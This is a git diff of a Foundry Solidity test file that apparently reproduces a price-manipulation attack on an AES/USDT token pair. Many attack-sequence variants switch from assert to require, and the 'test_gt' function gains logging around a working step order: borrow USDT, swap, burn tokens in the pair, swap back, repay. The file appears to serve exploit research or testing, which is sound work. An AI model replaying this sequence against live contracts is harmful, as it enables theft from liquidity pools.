@@ -211,7 +211,7 @@ contract AESTest is Test, BlockLoader {
         swap_pair_attacker_usdt_aes(amt1, amt2);
         swap_pair_attacker_aes_usdt(amt3, amt4);
         payback_usdt_owner(amt5);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -231,7 +231,7 @@ contract AESTest is Test, BlockLoader {
         swap_pair_attacker_usdt_aes(amt2, amt3);
         swap_pair_attacker_aes_usdt(amt4, amt5);
         payback_usdt_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -251,7 +251,7 @@ contract AESTest is Test, BlockLoader {
         burn_aes_pair(amt3);
         swap_pair_attacker_aes_usdt(amt4, amt5);
         payback_usdt_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -269,7 +269,7 @@ contract AESTest is Test, BlockLoader {
         swap_pair_attacker_aes_usdt(amt1, amt2);
         swap_pair_attacker_usdt_aes(amt3, amt4);
         payback_aes_owner(amt5);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -289,7 +289,7 @@ contract AESTest is Test, BlockLoader {
         swap_pair_attacker_aes_usdt(amt2, amt3);
         swap_pair_attacker_usdt_aes(amt4, amt5);
         payback_aes_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -309,7 +309,7 @@ contract AESTest is Test, BlockLoader {
         burn_aes_pair(amt3);
         swap_pair_attacker_usdt_aes(amt4, amt5);
         payback_aes_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -333,7 +333,7 @@ contract AESTest is Test, BlockLoader {
         swap_pair_attacker_usdt_aes(amt5, amt6);
         swap_pair_attacker_aes_usdt(amt7, amt8);
         payback_usdt_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -359,7 +359,7 @@ contract AESTest is Test, BlockLoader {
         swap_pair_attacker_usdt_aes(amt6, amt7);
         swap_pair_attacker_aes_usdt(amt8, amt9);
         payback_usdt_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -385,7 +385,7 @@ contract AESTest is Test, BlockLoader {
         swap_pair_attacker_usdt_aes(amt6, amt7);
         swap_pair_attacker_aes_usdt(amt8, amt9);
         payback_usdt_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -411,7 +411,7 @@ contract AESTest is Test, BlockLoader {
         swap_pair_attacker_usdt_aes(amt6, amt7);
         swap_pair_attacker_aes_usdt(amt8, amt9);
         payback_usdt_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -437,7 +437,7 @@ contract AESTest is Test, BlockLoader {
         burn_aes_pair(amt7);
         swap_pair_attacker_aes_usdt(amt8, amt9);
         payback_usdt_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -461,7 +461,7 @@ contract AESTest is Test, BlockLoader {
         swap_pair_attacker_aes_usdt(amt5, amt6);
         swap_pair_attacker_usdt_aes(amt7, amt8);
         payback_aes_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -487,7 +487,7 @@ contract AESTest is Test, BlockLoader {
         swap_pair_attacker_aes_usdt(amt6, amt7);
         swap_pair_attacker_usdt_aes(amt8, amt9);
         payback_aes_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -513,7 +513,7 @@ contract AESTest is Test, BlockLoader {
         swap_pair_attacker_aes_usdt(amt6, amt7);
         swap_pair_attacker_usdt_aes(amt8, amt9);
         payback_aes_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -539,7 +539,7 @@ contract AESTest is Test, BlockLoader {
         swap_pair_attacker_aes_usdt(amt6, amt7);
         swap_pair_attacker_usdt_aes(amt8, amt9);
         payback_aes_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -565,26 +565,39 @@ contract AESTest is Test, BlockLoader {
         burn_aes_pair(amt7);
         swap_pair_attacker_usdt_aes(amt8, amt9);
         payback_aes_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
     function test_gt() public {
         vm.startPrank(attacker);
+        emit log_named_uint("amt0", 100000e18);
         borrow_usdt_owner(100000e18);
         printBalance("After step0 ");
+        emit log_named_uint("amt1", usdt.balanceOf(attacker));
+        emit log_named_uint(
+            "amt2",
+            pair.getAmountOut(usdt.balanceOf(attacker), address(usdt))
+        );
         swap_pair_attacker_usdt_aes(
             usdt.balanceOf(attacker),
             pair.getAmountOut(usdt.balanceOf(attacker), address(usdt))
         );
         printBalance("After step1 ");
+        emit log_named_uint("amt3", 0);
         burn_aes_pair(0);
         printBalance("After step2 ");
+        emit log_named_uint("amt4", aes.balanceOf(attacker));
+        emit log_named_uint(
+            "amt5",
+            (pair.getAmountOut(aes.balanceOf(attacker), address(aes)) * 9) / 10
+        );
         swap_pair_attacker_aes_usdt(
             aes.balanceOf(attacker),
             (pair.getAmountOut(aes.balanceOf(attacker), address(aes)) * 9) / 10
         );
         printBalance("After step3 ");
+        emit log_named_uint("amt6", (100000e18 * 1003) / 1000);
         payback_usdt_owner((100000e18 * 1003) / 1000);
         printBalance("After step4 ");
         require(attackGoal(), "Attack failed!");
@@ -607,7 +620,7 @@ contract AESTest is Test, BlockLoader {
         burn_aes_pair(amt3);
         swap_pair_attacker_aes_usdt(amt4, amt5);
         payback_usdt_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 }
